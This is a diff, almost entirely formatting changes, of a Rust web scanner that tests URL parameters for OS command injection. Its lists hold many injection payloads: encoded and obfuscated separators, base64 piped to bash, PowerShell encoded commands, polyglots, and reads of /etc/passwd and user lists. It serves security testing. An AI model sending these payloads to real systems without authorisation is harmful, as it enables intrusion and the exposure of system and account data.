@@ -174,12 +174,15 @@ impl CommandInjectionScanner {
             ("/bin/id", "Full path id", false),
             ("/usr/bin/id", "Usr path id", false),
             ("/bin/cat /etc/passwd", "Full path cat passwd", false),
-
             // Windows commands
             ("dir", "Windows dir", true),
             ("dir C:\\", "Windows dir C:", true),
             ("type C:\\Windows\\win.ini", "Read win.ini", true),
-            ("type C:\\Windows\\System32\\drivers\\etc\\hosts", "Read hosts", true),
+            (
+                "type C:\\Windows\\System32\\drivers\\etc\\hosts",
+                "Read hosts",
+                true,
+            ),
             ("whoami", "Windows whoami", true),
             ("hostname", "Windows hostname", true),
             ("ipconfig", "Windows IP config", true),
@@ -206,19 +209,15 @@ impl CommandInjectionScanner {
             ("sleep 10", 10, false),
             ("sleep 3", 3, false),
             ("/bin/sleep 5", 5, false),
-
             // Unix ping (blocks for count * 1 second)
             ("ping -c 5 127.0.0.1", 5, false),
             ("ping -c 10 127.0.0.1", 10, false),
-
             // Windows timeout
             ("timeout /t 5", 5, true),
             ("timeout /t 10", 10, true),
-
             // Windows ping
             ("ping -n 5 127.0.0.1", 5, true),
             ("ping -n 10 127.0.0.1", 10, true),
-
             // Slow operations
             ("head -c 10000000 /dev/zero", 3, false),
             ("dd if=/dev/zero bs=1M count=100", 3, false),
@@ -425,33 +424,114 @@ impl CommandInjectionScanner {
         // URL encoded separators
         let encoded_payloads = vec![
             // URL encoded
-            ("%3bid", "URL encoded semicolon id", CmdInjectionCategory::EncodingBypass),
-            ("%3Bid", "URL encoded semicolon (upper) id", CmdInjectionCategory::EncodingBypass),
-            ("%7cid", "URL encoded pipe id", CmdInjectionCategory::EncodingBypass),
-            ("%7Cid", "URL encoded pipe (upper) id", CmdInjectionCategory::EncodingBypass),
-            ("%26id", "URL encoded ampersand id", CmdInjectionCategory::EncodingBypass),
-            ("%26%26id", "URL double ampersand id", CmdInjectionCategory::EncodingBypass),
-            ("%7c%7cid", "URL double pipe id", CmdInjectionCategory::EncodingBypass),
-            ("%60id%60", "URL encoded backticks id", CmdInjectionCategory::EncodingBypass),
-            ("%24(id)", "URL encoded dollar paren", CmdInjectionCategory::EncodingBypass),
-            ("%24%28id%29", "URL full encoded $(id)", CmdInjectionCategory::EncodingBypass),
-
+            (
+                "%3bid",
+                "URL encoded semicolon id",
+                CmdInjectionCategory::EncodingBypass,
+            ),
+            (
+                "%3Bid",
+                "URL encoded semicolon (upper) id",
+                CmdInjectionCategory::EncodingBypass,
+            ),
+            (
+                "%7cid",
+                "URL encoded pipe id",
+                CmdInjectionCategory::EncodingBypass,
+            ),
+            (
+                "%7Cid",
+                "URL encoded pipe (upper) id",
+                CmdInjectionCategory::EncodingBypass,
+            ),
+            (
+                "%26id",
+                "URL encoded ampersand id",
+                CmdInjectionCategory::EncodingBypass,
+            ),
+            (
+                "%26%26id",
+                "URL double ampersand id",
+                CmdInjectionCategory::EncodingBypass,
+            ),
+            (
+                "%7c%7cid",
+                "URL double pipe id",
+                CmdInjectionCategory::EncodingBypass,
+            ),
+            (
+                "%60id%60",
+                "URL encoded backticks id",
+                CmdInjectionCategory::EncodingBypass,
+            ),
+            (
+                "%24(id)",
+                "URL encoded dollar paren",
+                CmdInjectionCategory::EncodingBypass,
+            ),
+            (
+                "%24%28id%29",
+                "URL full encoded $(id)",
+                CmdInjectionCategory::EncodingBypass,
+            ),
             // Double URL encoded
-            ("%253bid", "Double encoded semicolon id", CmdInjectionCategory::DoubleEncoding),
-            ("%253Bid", "Double encoded semicolon (upper) id", CmdInjectionCategory::DoubleEncoding),
-            ("%257cid", "Double encoded pipe id", CmdInjectionCategory::DoubleEncoding),
-            ("%2526id", "Double encoded ampersand id", CmdInjectionCategory::DoubleEncoding),
-            ("%2560id%2560", "Double encoded backticks", CmdInjectionCategory::DoubleEncoding),
-            ("%2524%2528id%2529", "Double encoded $(id)", CmdInjectionCategory::DoubleEncoding),
-
+            (
+                "%253bid",
+                "Double encoded semicolon id",
+                CmdInjectionCategory::DoubleEncoding,
+            ),
+            (
+                "%253Bid",
+                "Double encoded semicolon (upper) id",
+                CmdInjectionCategory::DoubleEncoding,
+            ),
+            (
+                "%257cid",
+                "Double encoded pipe id",
+                CmdInjectionCategory::DoubleEncoding,
+            ),
+            (
+                "%2526id",
+                "Double encoded ampersand id",
+                CmdInjectionCategory::DoubleEncoding,
+            ),
+            (
+                "%2560id%2560",
+                "Double encoded backticks",
+                CmdInjectionCategory::DoubleEncoding,
+            ),
+            (
+                "%2524%2528id%2529",
+                "Double encoded $(id)",
+                CmdInjectionCategory::DoubleEncoding,
+            ),
             // Triple URL encoded
-            ("%25253bid", "Triple encoded semicolon id", CmdInjectionCategory::DoubleEncoding),
-            ("%25257cid", "Triple encoded pipe id", CmdInjectionCategory::DoubleEncoding),
-
+            (
+                "%25253bid",
+                "Triple encoded semicolon id",
+                CmdInjectionCategory::DoubleEncoding,
+            ),
+            (
+                "%25257cid",
+                "Triple encoded pipe id",
+                CmdInjectionCategory::DoubleEncoding,
+            ),
             // Unicode encoding
-            ("%u003bid", "Unicode semicolon", CmdInjectionCategory::EncodingBypass),
-            ("%u007cid", "Unicode pipe", CmdInjectionCategory::EncodingBypass),
-            ("%u0026id", "Unicode ampersand", CmdInjectionCategory::EncodingBypass),
+            (
+                "%u003bid",
+                "Unicode semicolon",
+                CmdInjectionCategory::EncodingBypass,
+            ),
+            (
+                "%u007cid",
+                "Unicode pipe",
+                CmdInjectionCategory::EncodingBypass,
+            ),
+            (
+                "%u0026id",
+                "Unicode ampersand",
+                CmdInjectionCategory::EncodingBypass,
+            ),
         ];
 
         for (payload, desc, category) in encoded_payloads {
@@ -468,7 +548,10 @@ impl CommandInjectionScanner {
         let hex_payloads = vec![
             ("$'\\x69\\x64'", "Hex encoded id"),
             ("$'\\x77\\x68\\x6f\\x61\\x6d\\x69'", "Hex encoded whoami"),
-            ("$'\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'", "Hex encoded cat /etc/passwd"),
+            (
+                "$'\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'",
+                "Hex encoded cat /etc/passwd",
+            ),
             ("$'\\x6c\\x73'", "Hex encoded ls"),
             ("$'\\x75\\x6e\\x61\\x6d\\x65'", "Hex encoded uname"),
         ];
@@ -523,7 +606,10 @@ impl CommandInjectionScanner {
             ("`echo aWQ= | base64 -d`", "Backtick base64 id"),
             ("$(echo d2hvYW1p | base64 -d)", "Base64 whoami"),
             ("$(echo bHM= | base64 -d)", "Base64 ls"),
-            ("$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)", "Base64 cat passwd"),
+            (
+                "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)",
+                "Base64 cat passwd",
+            ),
             (";echo aWQ= | base64 -d | bash", "Base64 piped to bash"),
             (";bash -c \"$(echo aWQ= | base64 -d)\"", "Bash -c base64"),
             ("|base64 -d<<<aWQ=", "Herestring base64"),
@@ -557,18 +643,15 @@ impl CommandInjectionScanner {
             (";$IFS'id'", "IFS with quotes"),
             (";$IFS$IFSid", "Double IFS"),
             ("$IFS;$IFS$9id", "IFS separator IFS id"),
-
             // Tab as separator
             (";\tid", "Tab separator id"),
             ("|\tid", "Pipe tab id"),
-
             // Various IFS variations
             (";{id}", "Brace id"),
             (";{id,}", "Brace expansion id"),
             (";{id,whoami}", "Multi brace expansion"),
             ("$IFS`id`", "IFS backtick"),
             ("$IFS$(id)", "IFS dollar-paren"),
-
             // Environment variables
             ("$SHELL", "Shell variable"),
             ("${SHELL}", "Shell variable braces"),
@@ -784,13 +867,11 @@ impl CommandInjectionScanner {
             ("\"$(id)\"", "Subst in double quotes"),
             ("\"`id`\"", "Backtick in double quotes"),
             ("\"$({id})\"", "Brace in double quotes"),
-
             // Escape breaking
             ("\\\";id", "Escaped quote break"),
             ("\\';id", "Escaped single quote break"),
             ("\\\n;id", "Escaped newline break"),
             ("\\`id\\`", "Escaped backticks"),
-
             // Argument injection
             ("\" -o evil.txt", "Argument injection"),
             ("' -o evil.txt", "Single arg injection"),
@@ -799,7 +880,6 @@ impl CommandInjectionScanner {
             ("--version;id", "Version flag injection"),
             ("-h;id", "Help flag injection"),
             ("--help$(id)", "Flag with subst"),
-
             // Filename context
             ("test.txt;id", "Filename semicolon"),
             ("test|id", "Filename pipe"),
@@ -807,7 +887,6 @@ impl CommandInjectionScanner {
             ("test$(id)", "Filename subst"),
             ("test\nid", "Filename newline"),
             ("test%0aid", "Filename URL newline"),
-
             // Path context
             ("../../../etc/passwd", "Path traversal"),
             (";cat ../../../etc/passwd", "Semicolon path traversal"),
@@ -838,14 +917,16 @@ impl CommandInjectionScanner {
             ("|whoami", "Pipe whoami"),
             ("||whoami", "Double pipe whoami"),
             ("& whoami", "Ampersand space whoami"),
-
             // CMD specific
             ("& echo %username%", "Echo username"),
             ("& echo %computername%", "Echo computername"),
             ("& dir", "Dir command"),
             ("& dir C:\\", "Dir C drive"),
             ("& type C:\\Windows\\win.ini", "Type win.ini"),
-            ("& type C:\\Windows\\System32\\drivers\\etc\\hosts", "Type hosts"),
+            (
+                "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
+                "Type hosts",
+            ),
             ("& net user", "Net user"),
             ("& net localgroup administrators", "Net admins"),
             ("& ipconfig", "Ipconfig"),
@@ -853,28 +934,27 @@ impl CommandInjectionScanner {
             ("& systeminfo", "Systeminfo"),
             ("& tasklist", "Tasklist"),
             ("& netstat -an", "Netstat"),
-
             // Environment variables
             ("&set", "Set command"),
             ("& echo %PATH%", "Echo PATH"),
             ("& echo %USERPROFILE%", "Echo userprofile"),
             ("& echo %TEMP%", "Echo temp"),
             ("& echo %SYSTEMROOT%", "Echo systemroot"),
-
             // PowerShell
             ("& powershell -c \"whoami\"", "PowerShell whoami"),
             ("& powershell -c \"Get-Process\"", "PowerShell processes"),
             ("& powershell -c \"Get-ChildItem\"", "PowerShell ls"),
-            ("& powershell -c \"Get-Content C:\\Windows\\win.ini\"", "PowerShell read file"),
+            (
+                "& powershell -c \"Get-Content C:\\Windows\\win.ini\"",
+                "PowerShell read file",
+            ),
             ("& powershell -enc d2hvYW1p", "PowerShell encoded"),
             ("& powershell -e d2hvYW1p", "PowerShell short encoded"),
             ("|powershell -c id", "Pipe PowerShell"),
-
             // CMD newlines
             ("%0d%0adir", "CRLF dir"),
             ("\r\ndir", "Raw CRLF dir"),
             ("%0adir", "LF dir"),
-
             // Concatenation
             ("&who^ami", "Caret whoami"),
             ("&wh\"\"oami", "Empty quotes whoami"),
@@ -904,32 +984,33 @@ impl CommandInjectionScanner {
             ("\"|id|\"", "Pipe polyglot"),
             ("$(id)`id`", "Substitution polyglot"),
             (";id||id&&id", "Chaining polyglot"),
-
             // Cross-platform
             (";id&whoami", "Unix/Windows semicolon ampersand"),
             ("|id|whoami", "Double pipe universal"),
             ("&id;whoami", "Ampersand semicolon"),
-
             // Escape polyglots
             ("\\';id;\\\"", "Escape polyglot"),
             ("\\'\\\"id\\'\\\"", "Multi escape"),
-
             // Multiple injection points
             (";id;#';id;#\";id;#", "Triple context"),
             ("%0a;id%0a|id%0a`id`", "Encoded multi"),
             ("$(id)|`id`|;id", "All substitution types"),
-
             // Comprehensive
-            ("a]|id||`id`||$(id)||;id;#\"';id;#\\", "Kitchen sink polyglot"),
+            (
+                "a]|id||`id`||$(id)||;id;#\"';id;#\\",
+                "Kitchen sink polyglot",
+            ),
             ("\n;id\n|id\n`id`\n$(id)", "Newline polyglot"),
             ("%0a%0d;id%0a%0d|id%0a%0d", "CRLF polyglot"),
-
             // Context-aware
             ("{{id}}", "Template injection style"),
             ("${id}", "Variable style"),
             ("#{id}", "Ruby/Shell style"),
             ("<%=id%>", "ERB style"),
-            ("{{constructor.constructor('return id')()}}", "Prototype pollution style"),
+            (
+                "{{constructor.constructor('return id')()}}",
+                "Prototype pollution style",
+            ),
         ];
 
         for (payload, desc) in polyglot_payloads {
@@ -955,45 +1036,38 @@ impl CommandInjectionScanner {
             (";WHOAMI", "Uppercase WHOAMI"),
             (";WhOaMi", "Mixed case whoami"),
             (";iD", "Mixed case id"),
-
             // Variable expansion
             (";i$()d", "Empty subshell concat"),
             (";i``d", "Empty backtick concat"),
             (";w$()hoami", "Empty subshell in word"),
             (";wh$()oami", "Empty subshell mid word"),
-
             // Reversed commands
             (";$(rev<<<'di')", "Reversed id"),
             (";$(printf 'id')", "Printf id"),
             (";$(printf '%s' 'id')", "Printf %s id"),
             (";$(echo 'di' | rev)", "Echo rev id"),
-
             // Brace expansion
             (";{i,}d", "Brace expansion id"),
             (";{id,}", "Brace expansion id alt"),
             (";{w,}hoami", "Brace expansion whoami"),
             (";{cat,} /etc/passwd", "Brace expansion cat"),
             (";{/bin/,}id", "Brace expansion path"),
-
             // Printf tricks
             (";$(printf '\\x69\\x64')", "Printf hex id"),
             (";$(printf '\\151\\144')", "Printf octal id"),
             (";$(printf '%s%s' 'i' 'd')", "Printf concat id"),
-
             // Eval tricks
             (";eval id", "Eval id"),
             (";eval 'id'", "Eval quoted id"),
             (";eval \"id\"", "Eval double quoted id"),
             (";eval $(echo id)", "Eval echo id"),
             (";eval `echo id`", "Eval backtick echo id"),
-
             // Bash -c tricks
             (";bash -c 'id'", "Bash -c id"),
             (";bash -c \"id\"", "Bash -c dquote id"),
             (";sh -c 'id'", "Sh -c id"),
             (";/bin/bash -c id", "Full path bash -c"),
             (";bash<<<id", "Bash herestring"),
-
             // Heredoc
             (";cat<<EOF\nid\nEOF", "Heredoc id"),
             (";bash<<EOF\nid\nEOF", "Bash heredoc"),
@@ -1118,7 +1192,10 @@ impl CommandInjectionScanner {
         // Phase 10: Obfuscation
         payloads.extend(self.generate_obfuscation_payloads());
 
-        info!("[CmdInjection] Generated {} enterprise-grade payloads", payloads.len());
+        info!(
+            "[CmdInjection] Generated {} enterprise-grade payloads",
+            payloads.len()
+        );
         payloads
     }
 
@@ -1128,21 +1205,65 @@ impl CommandInjectionScanner {
 
         // Essential metacharacters
         let essential = vec![
-            (";id", "Semicolon id", CmdInjectionCategory::ShellMetacharacters),
+            (
+                ";id",
+                "Semicolon id",
+                CmdInjectionCategory::ShellMetacharacters,
+            ),
             ("|id", "Pipe id", CmdInjectionCategory::ShellMetacharacters),
-            ("&&id", "Double ampersand id", CmdInjectionCategory::ShellMetacharacters),
-            ("||id", "Double pipe id", CmdInjectionCategory::ShellMetacharacters),
-            ("`id`", "Backtick id", CmdInjectionCategory::CommandSubstitution),
-            ("$(id)", "Dollar paren id", CmdInjectionCategory::CommandSubstitution),
+            (
+                "&&id",
+                "Double ampersand id",
+                CmdInjectionCategory::ShellMetacharacters,
+            ),
+            (
+                "||id",
+                "Double pipe id",
+                CmdInjectionCategory::ShellMetacharacters,
+            ),
+            (
+                "`id`",
+                "Backtick id",
+                CmdInjectionCategory::CommandSubstitution,
+            ),
+            (
+                "$(id)",
+                "Dollar paren id",
+                CmdInjectionCategory::CommandSubstitution,
+            ),
             ("\nid", "Newline id", CmdInjectionCategory::NewlineInjection),
-            ("%0aid", "URL newline id", CmdInjectionCategory::NewlineInjection),
+            (
+                "%0aid",
+                "URL newline id",
+                CmdInjectionCategory::NewlineInjection,
+            ),
             (";sleep 5", "Sleep 5", CmdInjectionCategory::TimeBased),
-            ("$(sleep 5)", "Dollar sleep 5", CmdInjectionCategory::TimeBased),
-            ("&whoami", "Ampersand whoami", CmdInjectionCategory::WindowsSpecific),
+            (
+                "$(sleep 5)",
+                "Dollar sleep 5",
+                CmdInjectionCategory::TimeBased,
+            ),
+            (
+                "&whoami",
+                "Ampersand whoami",
+                CmdInjectionCategory::WindowsSpecific,
+            ),
             ("|dir", "Pipe dir", CmdInjectionCategory::WindowsSpecific),
-            ("%3bid", "URL encoded semicolon", CmdInjectionCategory::EncodingBypass),
-            (";i''d", "Quote bypass id", CmdInjectionCategory::QuoteManipulation),
-            (";/???/i?", "Wildcard id", CmdInjectionCategory::WildcardBypass),
+            (
+                "%3bid",
+                "URL encoded semicolon",
+                CmdInjectionCategory::EncodingBypass,
+            ),
+            (
+                ";i''d",
+                "Quote bypass id",
+                CmdInjectionCategory::QuoteManipulation,
+            ),
+            (
+                ";/???/i?",
+                "Wildcard id",
+                CmdInjectionCategory::WildcardBypass,
+            ),
         ];
 
         for (payload, desc, category) in essential {
@@ -1151,7 +1272,11 @@ impl CommandInjectionScanner {
             } else {
                 DetectionMethod::OutputBased
             };
-            let delay = if payload.contains("sleep") { Some(5) } else { None };
+            let delay = if payload.contains("sleep") {
+                Some(5)
+            } else {
+                None
+            };
 
             payloads.push(CmdPayload {
                 payload: payload.to_string(),
@@ -1200,7 +1325,8 @@ impl CommandInjectionScanner {
         config: &ScanConfig,
     ) -> Result<(Vec<Vulnerability>, usize)> {
         // Default to Standard intensity for backwards compatibility
-        self.scan_parameter_with_intensity(base_url, parameter, config, PayloadIntensity::Standard).await
+        self.scan_parameter_with_intensity(base_url, parameter, config, PayloadIntensity::Standard)
+            .await
     }
 
     /// Scan a parameter for command injection with specified intensity (intelligent mode)
@@ -1224,7 +1350,10 @@ impl CommandInjectionScanner {
 
         // Smart parameter filtering - command injection needs command/file/path parameters
         if ParameterFilter::should_skip_parameter(parameter, ScannerType::CommandInjection) {
-            debug!("[CmdInjection] Skipping boolean/internal parameter: {}", parameter);
+            debug!(
+                "[CmdInjection] Skipping boolean/internal parameter: {}",
+                parameter
+            );
             return Ok((Vec::new(), 0));
         }
 
@@ -1248,8 +1377,12 @@ impl CommandInjectionScanner {
 
         if payloads.len() > payload_limit {
             payloads = Self::select_diverse_payloads(payloads, payload_limit);
-            info!("[CmdInjection] Intelligent mode: limited from {} to {} payloads (intensity: {:?})",
-                  original_count, payloads.len(), intensity);
+            info!(
+                "[CmdInjection] Intelligent mode: limited from {} to {} payloads (intensity: {:?})",
+                original_count,
+                payloads.len(),
+                intensity
+            );
         }
 
         let total_payloads = payloads.len();
@@ -1270,12 +1403,26 @@ impl CommandInjectionScanner {
 
         for payload in &payloads {
             let test_url = if base_url.contains('?') {
-                format!("{}&{}={}", base_url, parameter, urlencoding::encode(&payload.payload))
+                format!(
+                    "{}&{}={}",
+                    base_url,
+                    parameter,
+                    urlencoding::encode(&payload.payload)
+                )
             } else {
-                format!("{}?{}={}", base_url, parameter, urlencoding::encode(&payload.payload))
+                format!(
+                    "{}?{}={}",
+                    base_url,
+                    parameter,
+                    urlencoding::encode(&payload.payload)
+                )
             };
 
-            debug!("[CmdInjection] Testing [{}]: {}", payload.category.as_str(), payload.description);
+            debug!(
+                "[CmdInjection] Testing [{}]: {}",
+                payload.category.as_str(),
+                payload.description
+            );
 
             let request_start = Instant::now();
             match self.http_client.get(&test_url).await {
@@ -1314,7 +1461,11 @@ impl CommandInjectionScanner {
                                 &test_url,
                                 "Time-based command injection detected via timeout",
                                 Confidence::Medium,
-                                format!("Request timed out after {:?} (expected delay: {}s)", response_time, payload.expected_delay.unwrap_or(5)),
+                                format!(
+                                    "Request timed out after {:?} (expected delay: {}s)",
+                                    response_time,
+                                    payload.expected_delay.unwrap_or(5)
+                                ),
                                 &payload.category,
                             ));
                             break;
@@ -1429,12 +1580,18 @@ impl CommandInjectionScanner {
 
                 // Check that indicator wasn't in baseline
                 for (indicator, desc) in &unix_indicators {
-                    if body_lower.contains(indicator) && !baseline_body.to_lowercase().contains(indicator) {
+                    if body_lower.contains(indicator)
+                        && !baseline_body.to_lowercase().contains(indicator)
+                    {
                         return Some(self.create_vulnerability(
                             parameter,
                             &payload.payload,
                             test_url,
-                            &format!("Command injection detected via {} - {} found in response", payload.category.as_str(), desc),
+                            &format!(
+                                "Command injection detected via {} - {} found in response",
+                                payload.category.as_str(),
+                                desc
+                            ),
                             Confidence::High,
                             format!("Unix command output indicator: {}", indicator),
                             &payload.category,
@@ -1443,12 +1600,18 @@ impl CommandInjectionScanner {
                 }
 
                 for (indicator, desc) in &windows_indicators {
-                    if body_lower.contains(indicator) && !baseline_body.to_lowercase().contains(indicator) {
+                    if body_lower.contains(indicator)
+                        && !baseline_body.to_lowercase().contains(indicator)
+                    {
                         return Some(self.create_vulnerability(
                             parameter,
                             &payload.payload,
                             test_url,
-                            &format!("Command injection detected via {} - {} found in response", payload.category.as_str(), desc),
+                            &format!(
+                                "Command injection detected via {} - {} found in response",
+                                payload.category.as_str(),
+                                desc
+                            ),
                             Confidence::High,
                             format!("Windows command output indicator: {}", indicator),
                             &payload.category,
@@ -1459,21 +1622,34 @@ impl CommandInjectionScanner {
             DetectionMethod::ErrorBased => {
                 // Check for error messages that indicate command execution
                 let error_indicators = vec![
-                    "sh:", "bash:", "cmd.exe", "powershell",
-                    "command not found", "syntax error",
-                    "unexpected token", "not recognized",
-                    "invalid option", "missing operand",
-                    "no such file", "permission denied",
-                    "cannot execute", "not found",
+                    "sh:",
+                    "bash:",
+                    "cmd.exe",
+                    "powershell",
+                    "command not found",
+                    "syntax error",
+                    "unexpected token",
+                    "not recognized",
+                    "invalid option",
+                    "missing operand",
+                    "no such file",
+                    "permission denied",
+                    "cannot execute",
+                    "not found",
                 ];
 
                 for indicator in error_indicators {
-                    if body_lower.contains(indicator) && !baseline_body.to_lowercase().contains(indicator) {
+                    if body_lower.contains(indicator)
+                        && !baseline_body.to_lowercase().contains(indicator)
+                    {
                         return Some(self.create_vulnerability(
                             parameter,
                             &payload.payload,
                             test_url,
-                            &format!("Possible command injection via {} - shell error in response", payload.category.as_str()),
+                            &format!(
+                                "Possible command injection via {} - shell error in response",
+                                payload.category.as_str()
+                            ),
                             Confidence::Medium,
                             format!("Shell error indicator: {}", indicator),
                             &payload.category,
@@ -1512,7 +1688,9 @@ impl CommandInjectionScanner {
             payload: payload.to_string(),
             description: format!(
                 "Command injection vulnerability in parameter '{}'. {}. Bypass technique: {}",
-                parameter, description, category.as_str()
+                parameter,
+                description,
+                category.as_str()
             ),
             evidence: Some(evidence),
             cwe: "CWE-78".to_string(),
@@ -1521,7 +1699,7 @@ impl CommandInjectionScanner {
             false_positive: false,
             remediation: self.get_remediation(category),
             discovered_at: chrono::Utc::now().to_rfc3339(),
-                ml_data: None,
+            ml_data: None,
         }
     }
 
@@ -1698,7 +1876,11 @@ mod tests {
         let payloads = scanner.generate_enterprise_payloads();
 
         // Should have 1000+ enterprise-grade payloads
-        assert!(payloads.len() >= 1000, "Should have at least 1000 payloads, got {}", payloads.len());
+        assert!(
+            payloads.len() >= 1000,
+            "Should have at least 1000 payloads, got {}",
+            payloads.len()
+        );
         println!("Generated {} enterprise payloads", payloads.len());
     }
 
@@ -1708,7 +1890,11 @@ mod tests {
         let payloads = scanner.generate_metachar_payloads();
 
         // Should have many metacharacter combinations
-        assert!(payloads.len() >= 500, "Should have at least 500 metachar payloads, got {}", payloads.len());
+        assert!(
+            payloads.len() >= 500,
+            "Should have at least 500 metachar payloads, got {}",
+            payloads.len()
+        );
     }
 
     #[test]
@@ -1716,24 +1902,69 @@ mod tests {
         let scanner = create_test_scanner();
         let payloads = scanner.generate_enterprise_payloads();
 
-        let categories: std::collections::HashSet<_> = payloads.iter().map(|p| &p.category).collect();
+        let categories: std::collections::HashSet<_> =
+            payloads.iter().map(|p| &p.category).collect();
 
-        assert!(categories.iter().any(|c| **c == CmdInjectionCategory::ShellMetacharacters), "Missing ShellMetacharacters");
-        assert!(categories.iter().any(|c| **c == CmdInjectionCategory::CommandSubstitution), "Missing CommandSubstitution");
-        assert!(categories.iter().any(|c| **c == CmdInjectionCategory::NewlineInjection), "Missing NewlineInjection");
-        assert!(categories.iter().any(|c| **c == CmdInjectionCategory::EncodingBypass), "Missing EncodingBypass");
-        assert!(categories.iter().any(|c| **c == CmdInjectionCategory::TimeBased), "Missing TimeBased");
-        assert!(categories.iter().any(|c| **c == CmdInjectionCategory::FilterEvasion), "Missing FilterEvasion");
-        assert!(categories.iter().any(|c| **c == CmdInjectionCategory::WindowsSpecific), "Missing WindowsSpecific");
+        assert!(
+            categories
+                .iter()
+                .any(|c| **c == CmdInjectionCategory::ShellMetacharacters),
+            "Missing ShellMetacharacters"
+        );
+        assert!(
+            categories
+                .iter()
+                .any(|c| **c == CmdInjectionCategory::CommandSubstitution),
+            "Missing CommandSubstitution"
+        );
+        assert!(
+            categories
+                .iter()
+                .any(|c| **c == CmdInjectionCategory::NewlineInjection),
+            "Missing NewlineInjection"
+        );
+        assert!(
+            categories
+                .iter()
+                .any(|c| **c == CmdInjectionCategory::EncodingBypass),
+            "Missing EncodingBypass"
+        );
+        assert!(
+            categories
+                .iter()
+                .any(|c| **c == CmdInjectionCategory::TimeBased),
+            "Missing TimeBased"
+        );
+        assert!(
+            categories
+                .iter()
+                .any(|c| **c == CmdInjectionCategory::FilterEvasion),
+            "Missing FilterEvasion"
+        );
+        assert!(
+            categories
+                .iter()
+                .any(|c| **c == CmdInjectionCategory::WindowsSpecific),
+            "Missing WindowsSpecific"
+        );
     }
 
     #[test]
     fn test_category_names() {
-        assert_eq!(CmdInjectionCategory::ShellMetacharacters.as_str(), "Shell Metacharacters");
-        assert_eq!(CmdInjectionCategory::CommandSubstitution.as_str(), "Command Substitution");
+        assert_eq!(
+            CmdInjectionCategory::ShellMetacharacters.as_str(),
+            "Shell Metacharacters"
+        );
+        assert_eq!(
+            CmdInjectionCategory::CommandSubstitution.as_str(),
+            "Command Substitution"
+        );
         assert_eq!(CmdInjectionCategory::TimeBased.as_str(), "Time-Based Blind");
         assert_eq!(CmdInjectionCategory::Polyglot.as_str(), "Polyglot");
-        assert_eq!(CmdInjectionCategory::WildcardBypass.as_str(), "Wildcard Bypass");
+        assert_eq!(
+            CmdInjectionCategory::WildcardBypass.as_str(),
+            "Wildcard Bypass"
+        );
     }
 
     #[test]
@@ -1744,8 +1975,14 @@ mod tests {
         assert!(!payloads.is_empty(), "Should have time-based payloads");
 
         for payload in &payloads {
-            assert!(payload.expected_delay.is_some(), "Time-based payload should have expected delay");
-            assert!(matches!(payload.detection_method, DetectionMethod::TimeBased(_)), "Should use time-based detection");
+            assert!(
+                payload.expected_delay.is_some(),
+                "Time-based payload should have expected delay"
+            );
+            assert!(
+                matches!(payload.detection_method, DetectionMethod::TimeBased(_)),
+                "Should use time-based detection"
+            );
         }
     }
 
@@ -1754,7 +1991,11 @@ mod tests {
         let scanner = create_test_scanner();
         let separators = scanner.generate_separators();
 
-        assert!(separators.len() >= 10, "Should have at least 10 separators, got {}", separators.len());
+        assert!(
+            separators.len() >= 10,
+            "Should have at least 10 separators, got {}",
+            separators.len()
+        );
     }
 
     #[test]
@@ -1762,7 +2003,11 @@ mod tests {
         let scanner = create_test_scanner();
         let commands = scanner.generate_commands();
 
-        assert!(commands.len() >= 40, "Should have at least 40 commands, got {}", commands.len());
+        assert!(
+            commands.len() >= 40,
+            "Should have at least 40 commands, got {}",
+            commands.len()
+        );
 
         // Check for both Unix and Windows commands
         let has_unix = commands.iter().any(|(_, _, is_win)| !*is_win);
